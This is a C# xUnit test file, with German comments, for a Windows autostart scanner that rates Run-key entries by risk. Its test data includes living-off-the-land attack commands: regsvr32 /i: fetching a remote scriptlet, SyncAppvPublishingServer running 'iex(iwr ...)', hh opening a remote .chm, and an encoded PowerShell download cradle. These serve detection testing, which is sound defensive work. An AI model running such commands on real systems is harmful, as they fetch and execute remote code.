using Trendo.Core;
using Trendo.Core.Sys;
using Xunit;

namespace Trendo.Core.Tests;

/// <summary>T-0755 Fix2 (Zweitprüfung): umbenannte Windows-Werkzeuge, Werkzeuge außerhalb der Liste, file:, /enc mit Gedankenstrich,
/// Versionen mit &lt; &gt; und genaue Herausgeber-Varianten. Rot auf d810ffd3b, grün danach.</summary>
public class T0755_Fix2
{
    static readonly SignatureInfo Ms = new(SigState.Gueltig, "Microsoft Corporation", "Gültig signiert (Windows-Katalog).", true);
    static StartEntry Run(string cmd) => new(SystemScan.KindRun, "Test", @"HKCU\Software\Microsoft\Windows\CurrentVersion\Run", cmd, SystemScan.FileFromCommand(cmd));

    [Fact(DisplayName = "T-0755 Fix2 HOCH (echte Datei): umbenannte Kopie von regsvr32.exe unter %LOCALAPPDATA%\\Programs mit /i:http-Aufruf ist rot, auch ohne Netz-Adresse")]
    public void Renamed_regsvr32_copy_is_red()
    {
        if (!OperatingSystem.IsWindows()) return;
        var dir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Programs", "trendo-t0755-test-" + Guid.NewGuid().ToString("N")[..8]);
        Directory.CreateDirectory(dir);
        try
        {
            var helper = Path.Combine(dir, "helper.exe");
            File.Copy(Path.Combine(Environment.SystemDirectory, "regsvr32.exe"), helper);
            var sig = Authenticode.Check(helper); // echte Prüfung: die Kopie ist weiter gültig von Microsoft signiert (Katalog)
            Assert.Equal(SigState.Gueltig, sig.State); Assert.Contains("Microsoft", sig.Publisher);
            var net = SystemScan.Assess(Run($"\"{helper}\" /s /n /u /i:http://127.0.0.1/x.sct scrobj.dll"), sig);
            Assert.Equal(Ampel.Rot, net.Light);
            var quiet = SystemScan.Assess(Run($"\"{helper}\" /s scrobj.dll"), sig);
            Assert.Equal(Ampel.Rot, quiet.Light); Assert.Contains("regsvr32", quiet.Explanation, StringComparison.OrdinalIgnoreCase);
            // das echte regsvr32 im Windows-Ordner ohne Netz bleibt gelb (Werkzeug), nicht rot
            Assert.Equal(Ampel.Gelb, SystemScan.Assess(Run(Path.Combine(Environment.SystemDirectory, "regsvr32.exe") + " /s scrobj.dll"), Ms).Light);
        }
        finally { try { Directory.Delete(dir, true); } catch (IOException) { } catch (UnauthorizedAccessException) { } }
        Assert.False(Directory.Exists(dir));
    }

    [Fact(DisplayName = "T-0755 Fix2 MITTEL: Werkzeuge außerhalb der alten Liste – odbcconf, pcalua, SyncAppvPublishingServer, hh – nie grün; URL macht jeden Eintrag mindestens gelb")]
    public void More_tools_and_any_url()
    {
        if (!OperatingSystem.IsWindows()) return;
        Ampel L(string cmd) => SystemScan.Assess(Run(cmd), Ms).Light;
        Assert.Equal(Ampel.Rot, L(@"odbcconf /a {REGSVR C:\Users\Public\x.dll}"));
        Assert.Equal(Ampel.Rot, L(@"pcalua -a C:\Users\Public\x.exe"));
        Assert.Equal(Ampel.Rot, L(@"SyncAppvPublishingServer.exe ""n; iex(iwr http://example.invalid/x)"""));
        Assert.Equal(Ampel.Rot, L(@"hh http://example.invalid/y.chm"));
        Assert.Equal(Ampel.Rot, L(@"regsvr32 /s /n /u /i:file://10.0.0.1/x.sct scrobj.dll"));
        // gewöhnliches Programm (kein Werkzeug) mit Adresse: mindestens gelb; mit Programmziel im Public-Ordner: rot
        var k32 = Path.Combine(Environment.SystemDirectory, "kernel32.dll");
        var plain = new StartEntry(SystemScan.KindRun, "App", "HKCU", $"\"{k32}\" --start https://example.invalid/a", k32);
        Assert.NotEqual(Ampel.Gruen, SystemScan.Assess(plain, Ms).Light);
        var pub = new StartEntry(SystemScan.KindRun, "App", "HKCU", $"\"{k32}\" C:\\Users\\Public\\nachlader.exe", k32);
        Assert.Equal(Ampel.Rot, SystemScan.Assess(pub, Ms).Light);
        // Windows-eigene Einträge mit gewöhnlichen Argumenten bleiben grün
        Assert.Equal(Ampel.Gruen, L(Path.Combine(Environment.SystemDirectory, "CompatTelRunner.exe") + " -m:appraiser.dll -f:DoScheduledTelemetryRun"));
        Assert.Equal(Ampel.Gruen, L(Path.Combine(Environment.SystemDirectory, "defrag.exe") + " -c -h -o -$"));
        Assert.Equal(Ampel.Gruen, L(Path.Combine(Environment.SystemDirectory, "sc.exe") + " start wuauserv"));
    }

    [Fact(DisplayName = "T-0755 Fix2 NIEDRIG: /enc und Gedankenstrich-Varianten als versteckter Befehl; Versionen mit < > oder Unknown nicht bestätigt; genaue Herausgeber-Varianten")]
    public void Small_fixes()
    {
        if (!OperatingSystem.IsWindows()) return;
        var ps = Path.Combine(Environment.SystemDirectory, "WindowsPowerShell", "v1.0", "powershell.exe");
        const string B64 = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA";
        foreach (var sw in new[] { "/enc", "–enc", "—EncodedCommand", "/e" })
        {
            var f = SystemScan.Assess(Run($"\"{ps}\" -NoP {sw} {B64}"), Ms);
            Assert.Equal(Ampel.Rot, f.Light); Assert.Equal("Versteckter Befehl", f.Reason);
        }
        Assert.False(PackageParsers.SameVersion("< 2.47", "2.47")); Assert.False(PackageParsers.SameVersion("> 2.47", "2.47"));
        Assert.False(PackageParsers.SameVersion("Unknown", "Unknown")); Assert.True(PackageParsers.SameVersion("2.47.0", "2.47"));
        foreach (var ok in new[] { "Zoom Communications, Inc.", "Google Inc", "Advanced Micro Devices", "Dell Technologies Inc.", "Lenovo (Beijing) Limited", "UBISOFT ENTERTAINMENT INC.", "Microsoft Windows Hardware Compatibility Publisher" })
            Assert.True(SystemScan.KnownPublisher(ok), ok);
        Assert.False(SystemScan.KnownPublisher("Lenovo Fan Club")); Assert.False(SystemScan.KnownPublisher("Google Inc Fake"));
    }
}
